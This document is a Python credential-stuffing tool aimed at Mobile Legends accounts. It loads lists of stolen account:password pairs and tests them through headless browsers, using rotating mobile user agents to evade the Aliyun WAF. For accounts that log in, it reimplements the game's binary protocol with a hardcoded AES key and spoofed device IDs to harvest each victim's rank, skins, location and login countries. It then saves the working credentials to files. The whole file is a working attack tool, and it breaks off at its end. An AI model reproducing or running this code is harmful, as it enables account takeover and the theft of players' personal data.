import argparse
import csv
import hashlib
import json
import os
import queue
import random
import re
import socket
import struct
import sys
import threading
import time
import zlib
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from playwright.sync_api import sync_playwright, Browser, BrowserContext, Page

try:
    import zstandard as zstd
except ImportError:
    zstd = None

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False


# ---------- login -----------------------------------------------------------

API_BASE = "https://accountmtapi.mobilelegends.com/"
WAF_URL  = "https://mtacc.mobilelegends.com/"
REFERRER = "https://mtacc.mobilelegends.com/"

WORKERS          = 3
LOGIN_TIMEOUT_MS = 25_000
ROTATE_EVERY     = 10

UA_POOL = [
    {"ua": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
     "ch_ua": '"Chromium";v="131", "Not_A Brand";v="24", "Google Chrome";v="131"',
     "platform": '"Android"', "mobile": "?1"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
     "ch_ua": '"Chromium";v="130", "Not_A Brand";v="24", "Google Chrome";v="130"',
     "platform": '"Android"', "mobile": "?1"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
     "ch_ua": '"Chromium";v="129", "Not_A Brand";v="24", "Google Chrome";v="129"',
     "platform": '"Android"', "mobile": "?1"},
    {"ua": "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
     "ch_ua": '"Chromium";v="128", "Not_A Brand";v="24", "Google Chrome";v="128"',
     "platform": '"Android"', "mobile": "?1"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
     "ch_ua": '"Chromium";v="127", "Not_A Brand";v="24", "Google Chrome";v="127"',
     "platform": '"Android"', "mobile": "?1"},
]


def md5_hex(s):
    return hashlib.md5(s.encode("utf-8")).hexdigest()


def make_sign(params):
    items = sorted(params.items(), key=lambda kv: kv[0])
    return md5_hex("&".join(f"{k}={v}" for k, v in items) + "&op=new_login_pwd")


def build_payload(account, password):
    md5pwd = md5_hex(password)
    sign = make_sign({"account": account, "md5pwd": md5pwd, "country": ""})
    return json.dumps({
        "op": "new_login_pwd",
        "sign": sign,
        "params": {"account": account, "md5pwd": md5pwd, "country": ""},
        "lang": "en",
    }, separators=(",", ":"), ensure_ascii=False)


def is_challenge(body):
    if not body: return False
    if "renderData" in body or "aliyun_waf_aa" in body or "_waf_" in body: return True
    if len(body) > 0xC350: return True
    if body.startswith("<") and len(body) > 0x190: return True
    return False


def classify(body, http_status):
    if http_status == 0:
        b = body or ""
        if "Executable doesn't exist" in b: return "no_browser"
        if "Target closed" in b or "browser has been closed" in b: return "browser_crash"
        if "ERR:" in b: return "net_error"
        return "timeout"
    if http_status in (403, 429, 503): return "waf"
    if is_challenge(body): return "waf"
    if "Error_Success" in body: return "valid"
    return "invalid"


def extract_session(body):
    try:
        obj = json.loads(body)
    except Exception:
        return None, None
    if not isinstance(obj, dict):
        return None, None
    guid    = obj.get("guid")    or ""
    session = obj.get("session") or ""
    if not guid or not session:
        d = obj.get("data")
        if isinstance(d, dict):
            if not guid:    guid    = d.get("guid")    or ""
            if not session: session = d.get("session") or ""
    if not guid or not session:
        return None, None
    try:
        int(guid)
    except (ValueError, TypeError):
        return None, None
    return str(guid), str(session)


# ---------- sdp -------------------------------------------------------------

T_INT_POS, T_INT_NEG, T_FLOAT, T_DOUBLE, T_STRING = 0, 1, 2, 3, 4
T_LIST, T_DICT, T_STRUCT, T_STRUCT_END = 5, 6, 7, 8
_END = object()


def _write_number(buf, j):
    if j < 0: j = -j
    while j >= 0x80:
        buf.append((j & 0x7F) | 0x80); j >>= 7
    buf.append(j & 0x7F)


def _pack_header(buf, tag, typ):
    if tag < 15:
        buf.append((typ << 4) | tag)
    else:
        buf.append((typ << 4) | 15)
        _write_number(buf, tag)


def _pack(buf, tag, obj):
    if obj is None:
        _pack_header(buf, tag, T_INT_POS); _write_number(buf, 0)
    elif isinstance(obj, bool):
        _pack_header(buf, tag, T_INT_POS); _write_number(buf, 1 if obj else 0)
    elif isinstance(obj, int):
        if obj < 0:
            _pack_header(buf, tag, T_INT_NEG); _write_number(buf, -obj)
        else:
            _pack_header(buf, tag, T_INT_POS); _write_number(buf, obj)
    elif isinstance(obj, float):
        _pack_header(buf, tag, T_DOUBLE)
        _write_number(buf, 8); buf.extend(struct.pack("<d", obj))
    elif isinstance(obj, str):
        b = obj.encode("utf-8")
        _pack_header(buf, tag, T_STRING)
        _write_number(buf, len(b)); buf.extend(b)
    elif isinstance(obj, (bytes, bytearray)):
        b = bytes(obj)
        _pack_header(buf, tag, T_STRING)
        _write_number(buf, len(b)); buf.extend(b)
    elif isinstance(obj, list):
        _pack_header(buf, tag, T_LIST)
        _write_number(buf, len(obj))
        for v in obj: _pack(buf, 0, v)
    elif isinstance(obj, dict):
        _pack_header(buf, tag, T_DICT)
        items = sorted(obj.items(), key=lambda kv: kv[0])
        _write_number(buf, len(items))
        for k, v in items:
            _pack(buf, 0, k); _pack(buf, 0, v)
    elif isinstance(obj, SdpStruct):
        _pack_header(buf, tag, T_STRUCT)
        raw = obj.raw
        buf.extend(raw[1:-1]); buf.append(0x80)
    else:
        raise ValueError(f"unsupported SDP type: {type(obj)}")


class SdpStruct:
    def __init__(self, values=None):
        self.values = dict(values) if values else {}
        self._raw = None

    @property
    def raw(self):
        if self._raw is None: self._repack()
        return self._raw

    def _repack(self):
        buf = bytearray([0x70])
        for k in sorted(self.values.keys()):
            _pack(buf, k, self.values[k])
        buf.append(0x80)
        self._raw = bytes(buf)

    @classmethod
    def build(cls, values): return cls(values)

    @classmethod
    def decode(cls, data):
        st = cls(); st._raw = data; st._unpack_from(data); return st

    def _unpack_from(self, data):
        self.values = {}
        if not data or (data[0] >> 4) != T_STRUCT: return
        off = 1
        while off < len(data):
            tag, off = self._read_tag(data, off)
            v, off = self._unpack(data, off)
            if v is _END: break
            if v is not None: self.values[tag] = v

    @staticmethod
    def _read_number(data, off):
        result = data[off] & 0x7F; i = 1
        while (data[off + i - 1] & 0x80) != 0:
            result |= (data[off + i] & 0x7F) << (7 * i); i += 1
        return result, off + i

    @staticmethod
    def _read_tag(data, off):
        b = data[off]; tag = b & 0xF; off += 1
        if tag == 15: tag, off = SdpStruct._read_number(data, off)
        return tag, off

    @classmethod
    def _unpack(cls, data, off):
        if off >= len(data): return None, off
        b = data[off] & 0xFF; off += 1
        typ = (b >> 4) & 0xF; tag = b & 0xF
        if tag == 15: _, off = cls._read_number(data, off)

        if typ == T_INT_POS:
            v, off = cls._read_number(data, off); return v, off
        if typ == T_INT_NEG:
            v, off = cls._read_number(data, off); return -v, off
        if typ == T_FLOAT:
            n, off = cls._read_number(data, off)
            raw = int.from_bytes(data[off:off+n], "little")
            return struct.unpack("<f", struct.pack("<I", raw))[0], off + n
        if typ == T_DOUBLE:
            n, off = cls._read_number(data, off)
            raw = int.from_bytes(data[off:off+n], "little")
            return struct.unpack("<d", struct.pack("<Q", raw))[0], off + n
        if typ == T_STRING:
            n, off = cls._read_number(data, off)
            raw = data[off:off+n]; off += n
            try: return raw.decode("utf-8"), off
            except: return raw, off
        if typ == T_LIST:
            n, off = cls._read_number(data, off); out = []
            for _ in range(n):
                v, off = cls._unpack(data, off); out.append(v)
            return out, off
        if typ == T_DICT:
            n, off = cls._read_number(data, off); out = {}
            for _ in range(n):
                k, off = cls._unpack(data, off); v, off = cls._unpack(data, off)
                out[k] = v
            return out, off
        if typ == T_STRUCT:
            st = cls()
            while off < len(data):
                tag_off = off
                inner_tag, off = cls._read_tag(data, off)
                b2 = data[tag_off]
                if ((b2 >> 4) & 0xF) == T_STRUCT_END: break
                v, off = cls._unpack(data, off)
                if v is _END: break
                if v is not None: st.values[inner_tag] = v
            st._repack(); return st, off
        if typ == T_STRUCT_END:
            return _END, off
        raise ValueError(f"unknown SDP type {typ}")

    def get(self, i, default=None): return self.values.get(i, default)
    def get_long(self, i):
        v = self.values.get(i)
        return int(v) if isinstance(v, (int, float)) else 0
    def get_str(self, i):
        v = self.values.get(i)
        return v if isinstance(v, str) else None
    def get_list(self, i):
        v = self.values.get(i)
        return v if isinstance(v, list) else None
    def get_struct(self, i):
        v = self.values.get(i)
        return v if isinstance(v, SdpStruct) else None


# ---------- crypto / compression --------------------------------------------

AES_KEY = bytes.fromhex("f5a193d50ade553e9835595f5cd75ddd")
AES_IV  = b"\x00" * 16


def aes_decrypt(data):
    if not HAVE_CRYPTO: return data
    try:
        c = Cipher(algorithms.AES(AES_KEY), modes.CBC(AES_IV)).decryptor()
        return (c.update(data) + c.finalize()).rstrip(b"\x00")
    except Exception:
        return data


def zstd_compress(data):
    if zstd is None: raise RuntimeError("pip install zstandard")
    return zstd.ZstdCompressor().compress(data)


def zstd_decompress(data):
    if zstd is None: raise RuntimeError("pip install zstandard")
    try: return zstd.ZstdDecompressor().decompress(data, max_output_size=1 << 24)
    except Exception: return b""


# ---------- game protocol ---------------------------------------------------

LOGIN_HOST = "global-login.ml.youngjoygame.com"
LOGIN_PORT = 0x7545
CLIENT_VERSION = "2.2.16.1232.1"
CHANNEL = "and_usa"


class GameConn:
    def __init__(self, device_id):
        self.device_id = device_id
        s = device_id.split("_", 1)[1] if "_" in device_id else device_id
        self.imei_md5       = s[0:32]  if len(s) >= 32 else ""
        self.android_id     = s[32:48] if len(s) >= 48 else ""
        self.advertising_id = s[48:]   if len(s) >  48 else ""
        self.sock = None
        self.buf = bytearray()
        self.seq = 1
        self.account_id = 0
        self.session_key = ""
        self.zone_id = 0
        self.game_host = ""
        self.game_port = 0
        self.last_body = None
        self.last_cmd = 0

    def _connect(self, host, port, timeout=6000):
        self.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout / 1000.0)
        s.connect((host, port))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.sock = s; self.buf.clear(); return True

    def close(self):
        if self.sock:
            try: self.sock.close()
            except Exception: pass
            self.sock = None

    def _send(self, cmd, body):
        outer = SdpStruct.build({0: cmd, 1: self.seq, 5: body.raw})
        payload = zstd_compress(outer.raw)
        header = (len(payload) + 4) | 0x10000000
        self.sock.sendall(header.to_bytes(4, "big") + payload)
        self.seq += 1

    def _decode(self, payload, flag):
        if flag == 1:
            try: payload = zlib.decompress(payload)
            except Exception: pass
        elif flag == 16: payload = zstd_decompress(payload)
        elif flag == 2:  payload = aes_decrypt(payload)
        elif flag == 3:
            payload = aes_decrypt(payload)
            try: payload = zlib.decompress(payload)
            except Exception: pass
        elif flag == 0x12:
            payload = aes_decrypt(payload)
            payload = zstd_decompress(payload)
        return SdpStruct.decode(payload)

    def _read_frame(self):
        while len(self.buf) < 4:
            chunk = self.sock.recv(4096)
            if not chunk: return -8, -8
            self.buf.extend(chunk)
        header = int.from_bytes(self.buf[:4], "big")
        length = header & 0xFFFFFF
        flag   = (header >> 24) & 0xFF
        while len(self.buf) < length:
            chunk = self.sock.recv(4096)
            if not chunk: return -8, -8
            self.buf.extend(chunk)
        frame = bytes(self.buf); self.buf = bytearray(frame[length:])
        try: st = self._decode(frame[4:length], flag)
        except Exception: return -8, -8
        cmd = st.get_long(0); self.last_cmd = cmd
        body = st.get(6)
        if not isinstance(body, (bytes, bytearray)): body = st.get(5)
        if isinstance(body, (bytes, bytearray)):
            try: self.last_body = SdpStruct.decode(body)
            except Exception: self.last_body = None
        else:
            self.last_body = None
        return cmd, flag

    def _recv(self):
        try: cmd, _ = self._read_frame()
        except Exception: cmd = -8
        return cmd

    def login_to_login_server(self):
        self._connect(LOGIN_HOST, LOGIN_PORT)
        params = (f"gps_adid={self.advertising_id}"
                  f"&android_id={self.android_id}"
                  f"&device_unique_id={self.imei_md5}")
        body = SdpStruct.build({0: self.device_id, 1: params, 2: CLIENT_VERSION, 3: CHANNEL, 4: "en"})
        self._send(1, body)
        if self._recv() == 2 and self.last_body:
            self.account_id = self.last_body.get_long(0)
            self.session_key = self.last_body.get_str(1) or ""
            zone = self.last_body.get_struct(2)
            if zone: self.zone_id = zone.get_long(0)
            return self.account_id != 0 and self.session_key != ""
        return False

    def get_game_server(self):
        body = SdpStruct.build({0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION,
                                5: self.zone_id, 6: CHANNEL})
        self._send(5, body)
        if self._recv() != 6 or not self.last_body: return False
        s = self.last_body.get_str(1)
        if not s or ":" not in s: return False
        self.game_host, port = s.split(":", 1)
        self.game_port = int(port); return True

    def connect_to_game_server(self):
        for _ in range(5):
            try:
                self.close(); self._connect(self.game_host, self.game_port)
                b1 = SdpStruct.build({0: self.account_id, 1: self.session_key, 2: self.zone_id,
                                      4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id})
                self._send(0x2711, b1)
                self._send(0x2775, SdpStruct.build({0: 0, 2: 2}))
                while True:
                    cmd = self._recv()
                    if cmd == -8: break
                    if cmd == 0x2712: return True
                    if cmd == -1: break
            except Exception:
                pass
            time.sleep(1.0)
        return False

    def get_account_info(self, account_id, token):
        mt_and = f"mt-and_{account_id}"
        variants = [
            [mt_and, f"token={token}&name=&id={account_id}&nid=", 0],
            [mt_and, f"token={token}", 0],
            [str(account_id), token, 0],
        ]
        for v in variants:
            try:
                self._send(0x27DF, SdpStruct.build({0: v[0], 1: v[1], 2: v[2]}))
                for _ in range(3):
                    cmd = self._recv()
                    if cmd == -8: break
                    if cmd == -1: continue
                    if cmd == 0x27E0 and self.last_body: return self.last_body
            except Exception:
                continue
        return None

    def get_highest_level_role(self, info):
        if not info: return None
        lst = info.get_list(2)
        if not lst: return None
        best_id = best_lvl = best_lv = 0
        for e in lst:
            if isinstance(e, SdpStruct):
                rid, lvl, lv = e.get_long(0), e.get_long(1), e.get_long(3)
            elif isinstance(e, list):
                rid = int(e[0]) if len(e) > 0 else 0
                lvl = int(e[1]) if len(e) > 1 else 0
                lv  = int(e[3]) if len(e) > 3 else 0
            else:
                continue
            if lv > best_lv: best_id, best_lvl, best_lv = rid, lvl, lv
        return (best_id, best_lvl) if best_id else None

    def get_role_detail(self, role_id):
        self._send(0x2B91, SdpStruct.build({1: role_id}))
        while True:
            cmd = self._recv()
            if cmd in (-8, -1): return None
            if cmd == 0x2B92:   return self.last_body

    def get_role_info(self, role_id, level):
        self._send(0x279F, SdpStruct.build({0: role_id, 1: level}))
        while True:
            cmd = self._recv()
            if cmd in (-8, -1): return None
            if cmd == 0x27A0:   return self.last_body


# ---------- info fetch ------------------------------------------------------

BUILTIN_DEVICES = [
    "and_33c9084d10d104e2e0e95288782a92ff3h0ixfjcdk5dm3i9deffa6fb-7f6c-4b46-bcc3-a52ab97c367c",
    "and_8f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0123456789abcdef01234567-0123-4567-89ab-cdef0123",
]


def load_devices(path):
    out = []
    if path:
        p = Path(path)
        if p.exists():
            try:
                for line in p.read_text(encoding="utf-8", errors="ignore").splitlines():
                    line = line.strip()
                    if line and line.startswith("and_"): out.append(line)
            except Exception:
                pass
    if not out:
        print(f"[devices] {path} missing or empty - using BUILTIN_DEVICES", flush=True)
        return list(BUILTIN_DEVICES)
    return out


def fetch_info(account_id, token, devices, deadline_ms=20_000):
    deadline = time.time() + deadline_ms / 1000.0
    while time.time() < deadline:
        g = GameConn(random.choice(devices))
        try:
            if not g.login_to_login_server():  continue
            if not g.get_game_server():        continue
            if not g.connect_to_game_server(): continue
            info = g.get_account_info(account_id, token)
            if info is None:                   continue
            highest = g.get_highest_level_role(info)
            if not highest:                    continue
            rid, lvl = highest
            detail = g.get_role_detail(rid)
            if detail is None:                 continue
            role = g.get_role_info(rid, lvl)
            if role is None:                   continue
            out = extract(detail, role)
            if out: return out
        except Exception:
            continue
        finally:
            g.close()
    return None


# ---------- extractor -------------------------------------------------------

HERO_NAMES = [
    "Miya","Balmond","Saber","Alice","Nana","Tigreal","Alucard","Karina","Akai","Franco",
    "Bane","Bruno","Clint","Rafaela","Eudora","Zilong","Fanny","Layla","Minotaur","Lolita",
    "Hayabusa","Freya","Gord","Natalia","Kagura","Chou","Sun","Alpha","Ruby","Yi Sun-shin",
    "Moskov","Johnson","Cyclops","Estes","Hilda","Aurora","Lapu-Lapu","Vexana","Roger","Karrie",
    "Gatotkaca","Harley","Irithel","Grock","Argus","Odette","Lancelot","Diggie","Hylos","Zhask",
    "Helcurt","Pharsa","Lesley","Jawhead","Angela","Gusion","Valir","Martis","Uranus","Hanabi",
    "Chang'e","Kaja","Selena","Aldous","Claude","Vale","Leomord","Lunox","Hanzo","Belerick",
    "Kimmy","Thamuz","Harith","Minsitthar","Kadita","Faramis","Badang","Khufra","Granger","Guinevere",
    "Esmeralda","Terizla","X.Borg","Ling","Dyrroth","Lylia","Baxia","Masha","Wanwan","Silvanna",
    "Cecilion","Carmilla","Atlas","Popol and Kupa","Yu Zhong","Luo Yi","Benedetta","Khaleed","Barats","Brody",
    "Yve","Mathilda","Paquito","Gloo","Beatrix","Phoveus","Natan","Aulus","Aamon","Valentina",
    "Edith","Floryn","Yin","Melissa","Xavier","Julian","Fredrinn","Joy","Novaria","Arlott",
    "Ixia","Nolan","Cici","Chip","Zhuxin","Suyou","Lukas","Kalea","Zetian",
]
HERO_IDS = list(range(1, len(HERO_NAMES) + 1))

RANK_BANDS = [
    (0x00,0x03),(0x04,0x07),(0x08,0x0B),(0x0C,0x10),(0x11,0x15),(0x16,0x1A),
    (0x1B,0x1F),(0x20,0x24),(0x25,0x29),(0x2A,0x2E),(0x2F,0x34),(0x35,0x3A),
    (0x3B,0x40),(0x41,0x46),(0x47,0x4C),(0x4D,0x52),(0x53,0x58),(0x59,0x5E),
    (0x5F,0x64),(0x65,0x6A),(0x6B,0x70),(0x71,0x76),(0x77,0x7C),(0x7D,0x82),(0x83,0x88),
]
RANK_NAMES = [
    "Warrior III","Warrior II","Warrior I","Elite III","Elite II","Elite I",
    "Master IV","Master III","Master II","Master I",
    "Grandmaster V","Grandmaster IV","Grandmaster III","Grandmaster II","Grandmaster I",
    "Epic V","Epic IV","Epic III","Epic II","Epic I",
    "Legend V","Legend IV","Legend III","Legend II","Legend I",
]
COLLECTOR_TIERS = [
    (1000, 4000, "Amateur Collector"),
    (4000, 10000, "Junior Collector"),
    (10000, 22000, "Seasoned Collector"),
    (22000, 44000, "Expert Collector"),
    (44000, 84000, "Renowned Collector"),
    (84000, 160000, "Exalted Collector"),
    (160000, 280000, "Mega Collector"),
    (280000, 2**63 - 1, "World Collector"),
]


def map_rank(j):
    for i, (lo, hi) in enumerate(RANK_BANDS):
        if lo <= j <= hi: return RANK_NAMES[i]
    if 0x88 <= j <= 0xA1: return f"Mythic {j - 0x88}"
    if 0xA2 <= j <= 0xBA: return f"Mythical Honor {j - 0x88}"
    if 0xBB <= j <= 0xEC: return f"Mythical Glory {j - 0x88}"
    if 0xED <= j <= 0x270F: return f"Mythical Immortal {j - 0x88}"
    return "Unknown"


def map_collector_point(j):
    if j < 1000: return "No Tier"
    for i, (lo, hi, name) in enumerate(COLLECTOR_TIERS):
        if lo <= j < hi:
            if i == len(COLLECTOR_TIERS) - 1: return name
            step = (hi - lo) // 5
            idx = max(0, min(4, (j - lo) // step))
            return f"{name} {['V','IV','III','II','I'][idx]}"
    return "Unknown"


def fmt_ts(ts):
    if ts == 0: return "Never"
    try: return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(ts))
    except Exception: return "Unknown"


def norm(v):
    if v is None: return ""
    return str(v).replace("`", "").strip()


def hero_history(ids):
    out = []
    if not ids: return out
    for i in range(len(ids) - 1, -1, -1):
        if len(out) >= 5: break
        v = ids[i]
        if not isinstance(v, (int, float)): continue
        vid = int(v); name = None
        for idx, hid in enumerate(HERO_IDS):
            if hid == vid: name = HERO_NAMES[idx]; break
        out.append(name or f"Unknown({vid})")
    return out


def parse_skin_counts(st):
    out = {}
    names = ["Common Skins","Exceptional Skins","Deluxe Skins","Exquisite Skins","Grand Skins","Supreme Skins"]
    keys  = [1, 2, 3, 4, 5, 6]
    if not st: return out
    v = st.get(4)
    if isinstance(v, SdpStruct):
        for i, k in enumerate(keys):
            n = v.get(k)
            if isinstance(n, (int, float)): out[names[i]] = int(n)
    elif isinstance(v, dict):
        for i, k in enumerate(keys):
            n = v.get(k) or v.get(str(k))
            if isinstance(n, (int, float)): out[names[i]] = int(n)
    return out


def extract(detail, role_info):
    if not detail: return None
    lst = detail.get(0)
    if not isinstance(lst, list) or not lst: return None
    first = lst[0]
    if not isinstance(first, SdpStruct): return None

    location = "NOT FOUND"
    loc_list = first.get(0x47)
    if isinstance(loc_list, list) and len(loc_list) >= 2:
        location = ", ".join(str(x) for x in loc_list)

    last_login_ts      = first.get_long(5)
    last_login_country = norm(first.get(0x57)) or "Unknown"
    create_country     = norm(first.get(0x61)) or "Unknown"

    squad_name = norm(first.get(0x1F))
    squad_id   = norm(first.get(0x1E))
    squad = "-" if not squad_id else f"{squad_name} {squad_id}".strip()

    high_code = first.get(0x5F)
    cur_code  = first.get(8)
    high_rank = map_rank(int(high_code)) if isinstance(high_code, (int, float)) else "Unknown"
    cur_rank  = map_rank(int(cur_code))  if isinstance(cur_code,  (int, float)) else "Unknown"

    hero_count = role_info.get_long(9)    if role_info else 0
    matches    = role_info.get_long(0x16) if role_info else 0
    skin_counts = parse_skin_counts(role_info.get_struct(0x76)) if role_info else {}

    collector_pts = 0; collector_rk = 0
    col_struct = first.get_struct(0x88)
    if col_struct:
        collector_pts = col_struct.get_long(9)
        collector_rk  = col_struct.get_long(10)

    hist = hero_history(first.get_list(0x5B) or []) or ["Private / Not Available"]

    v2l = False
    v = first.get(0xD)
    if isinstance(v, (int, float)) and int(v) == 1: v2l = True

    skin_count = first.get(0x53)
    skin_count = str(skin_count) if skin_count is not None else "Unknown"

    return {
        "status": "success",
        "data": {
            "basic_info": {
                "nickname":   norm(first.get(2)) or "Unknown",
                "player_id":  str(first.get(0)),
                "server":     str(first.get(1)),
                "level":      str(first.get(3)),
                "skin_count": skin_count,
                "hero_count": str(hero_count),
            },
            "skin_info": {"skin_breakdown": skin_counts},
            "location_info": {
                "location":               location,
                "last_login":             fmt_ts(last_login_ts),
                "last_login_country":     last_login_country,
                "create_account_country": create_country,
            },
            "game_info": {
                "current_rank":       cur_rank,
                "high_rank":          high_rank,
                "achievement_points": str(first.get_long(7)),
                "squad":              squad,
                "hero_history":       hist,
                "matches":            str(matches),
            },
            "collector_info": {
                "collector_point": str(collector_pts),
                "collector_tier":  map_collector_point(collector_pts),
                "collector_rank":  str(collector_rk),
            },
            "security_info": {"v2l_status": "Yes" if v2l else "No"},
        },
    }


def format_pipe(info):
    if not info: return "INFOS-FAIL"
    try:
        d = info["data"]
        bi, gi, li, ci, si = (d["basic_info"], d["game_info"], d["location_info"],
                              d["collector_info"], d["security_info"])
        skin = d["skin_info"]["skin_breakdown"]
        skin_s = "; ".join(f"{k}:{v}" for k, v in skin.items() if v) or "N/A"
        return " | ".join([
            f"V2L Status : {si['v2l_status'].lower()}",
            f"Nickname : {bi['nickname']}",
            f"Player ID : {bi['player_id']}",
            f"Server : {bi['server']}",
            f"Level : {bi['level']}",
            f"Skin Count : {bi['skin_count']}",
            f"Hero Count : {bi['hero_count']}",
            f"Skin Breakdown : {skin_s}",
            f"Current Rank : {gi['current_rank']}",
            f"Highest Rank : {gi['high_rank']}",
            f"Achievement : {gi['achievement_points']}",
            f"Total Matches : {gi['matches']}",
            f"Squad : {gi['squad']}",
            f"Recent Heroes : {', '.join(gi['hero_history'])}",
            f"Collector : {ci['collector_tier']} ({ci['collector_point']} pts)",
            f"Location : {li['location']}",
            f"Last Login : {li['last_login']}",
            f"Last Login Country : {li['last_login_country']}",
            f"Create Account Country : {li['create_account_country']}",
            f"Collector Rank : {ci['collector_rank']}",
        ])
    except Exception as e:
        return f"INFOS-FAIL ({e})"


# ---------- checker ---------------------------------------------------------

@dataclass
class Result:
    account:  str
    password: str
    status:   str
    body:     str = ""
    info:     str = ""


class Checker:
    def __init__(self, browser, log_q):
        self.browser = browser
        self.log_q = log_q
        self.counter = 0
        self.lock = threading.Lock()
        self.ua_index = int(time.time() * 1000) % len(UA_POOL)
        self.ctx = None
        self.page = None

    def _ua(self): return UA_POOL[self.ua_index % len(UA_POOL)]

    def _new_context(self):
        ua = self._ua()
        if self.ctx:
            try: self.ctx.close()
            except Exception: pass
        self.ctx = self.browser.new_context(
            user_agent=ua["ua"], locale="en-US",
            viewport={"width": 412, "height": 915},
            is_mobile=True, has_touch=True,
            extra_http_headers={
                "sec-ch-ua":          ua["ch_ua"],
                "sec-ch-ua-mobile":   ua["mobile"],
                "sec-ch-ua-platform": ua["platform"],
                "referer":            REFERRER,
                "origin":             WAF_URL.rstrip("/"),
            },
        )
        self.page = self.ctx.new_page()
        self._warmup()

    def _warmup(self):
        try:
            self.page.goto(WAF_URL, wait_until="domcontentloaded", timeout=30_000)
            print(f"[warmup] url={self.page.url}", flush=True)
            try:
                print(f"[warmup] title={self.page.title()}", flush=True)
            except Exception:
                pass
        except Exception as e:
            print(f"[warmup] goto FAILED: {e}", flush=True)
            self.log_q.put(f"[waf] {e}")
        try:
            self.page.wait_for_timeout(2500)
        except Exception:
            pass
        try:
            cookies = self.ctx.cookies()
            names = sorted({c["name"] for c in cookies})
            print(f"[warmup] cookies={names}", flush=True)
            if "acw_sc__v2" not in names:
                print("[warmup] WARNING: acw_sc__v2 missing - WAF challenge did not run", flush=True)
        except Exception as e:
            print(f"[warmup] cookie check failed: {e}", flush=True)

    def rotate(self):
        self.ua_index += 1
        print(f"[rotate] ua_index -> {self.ua_index}", flush=True)
        self.log_q.put(f"[rotate] ua_index -> {self.ua_index}")
        self._new_context()

    def login(self, account, password):
        with self.lock:
            self.counter += 1; n = self.counter
        if n > 1 and (n - 1) % ROTATE_EVERY == 0:
            self.rotate()
        payload = build_payload(account, password)
        last_err = ""
        for attempt in range(3):
            try:
                res = self.page.evaluate(
                    """
                    async ([url, body]) => {
                        try {
                            const r = await fetch(url, {
                                method: 'POST', credentials: 'include',
                                headers: {'Content-Type': 'application/json'},
                                body: body,
                            });
                            return { status: r.status, text: await r.text() };
                        } catch (e) { return { status: 0, text: 'ERR:'+String(e) }; }
                    }
                    """,
                    [API_BASE, payload],
                    timeout=LOGIN_TIMEOUT_MS,
                )
            except Exception as e:
                last_err = f"eval:{e}"
                print(f"[login] {account} attempt {attempt+1} error: {e}", flush=True)
                time.sleep(0.5)
                continue
            status = int(res.get("status", 0))
            body = res.get("text", "") or ""
            kind = classify(body, status)
            if kind != "timeout":
                return Result(account, password, kind, body)
            last_err = body
            print(f"[login] {account} attempt {attempt+1} status={status} body={body[:120]!r}", flush=True)
            time.sleep(0.5)
        return Result(account, password, "timeout", last_err)


# ---------- run -------------------------------------------------------------

def load_combos(path):
    out = []
    with Path(path).open("r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"): continue
            if ":" in line:   a, p = line.split(":", 1)
            elif "|" in line: a, p = line.split("|", 1)
            else: continue
            out.append((a.strip(), p.strip()))
    return out


def run(infile, outfile, workers, headless, with_info, devices_file):
    combos = load_combos(infile)
    if not combos:
        print(f"no combos in {infile}", file=sys.stderr); return 2
    print(f"loaded {len(combos)} combos" + (" (+info)" if with_info else ""), flush=True)
    devices = load_devices(devices_file) if with_info else []
    log_q = queue.Queue()
    results = []
    results_lock = threading.Lock()

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=headless)
        checkers = []
        for _ in range(workers):
            c = Checker(browser, log_q)
            c._new_context()
            checkers.append(c)
        chunks = [combos[i::workers] for i in range(workers)]

        def worker(idx, chunk):
            c = checkers[idx]
            for account, password in chunk:
                r = c.login(account, password)
                if with_info and r.status == "valid":
                    aid, tok = extract_session(r.body)
                    if aid and tok:
                        r.info = format_pipe(fetch_info(int(aid), tok, devices))
                    else:
                        r.info = "INFOS-FAIL (no guid/session in body)"
                with results_lock:
                    results.append(r)
                extra = f" -> {r.info[:80]}" if r.info else ""
                print(f"[{r.status:12s}] {account}:{password}{extra}", flush=True)
                log_q.put(f"[{r.status:12s}] {account}:{password}{extra}")
                time.sleep(3.0 + random.random() * 8.0)

        try:
            threads = []
            for i in range(workers):
                t = threading.Thread(target=worker, args=(i, chunks[i]), daemon=True)
                t.start(); threads.append(t)
            for t in threads: t.join()
        finally:
            for c in checkers:
                try: c.ctx.close()
                except Exception: pass
            browser.close()

    Path(outfile).parent.mkdir(parents=True, exist_ok=True)
    with Path(outfile).open("w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["account", "password", "status", "body", "info"])
        for r in results:
            w.writerow([r.account, r.password, r.status, r.body[:4000], r.info])

    _data_dir = Path(os.environ.get("ML_DATA_DIR", "/tmp/npa"))
    _data_dir.mkdir(parents=True, exist_ok=True)
    full_path = _data_dir / "valid_full.txt"
    with full_path.open("a", encoding="utf-8") as f:
        for r in results:
            if r.status != "valid" or not r.info: continue
            lvl = skin = ""
            for part in r.info.split(" | "):
                p = part.strip()
                if p.startswith("Level : "):       lvl  = p[8:].strip()
                elif p.startswith("Skin Count : "): skin = p[13:].strip()
            f.write(f"{r.account}:{r.password} | Lvl:{lvl} Skin:{skin} | {r.info}\n")

    counts = {}
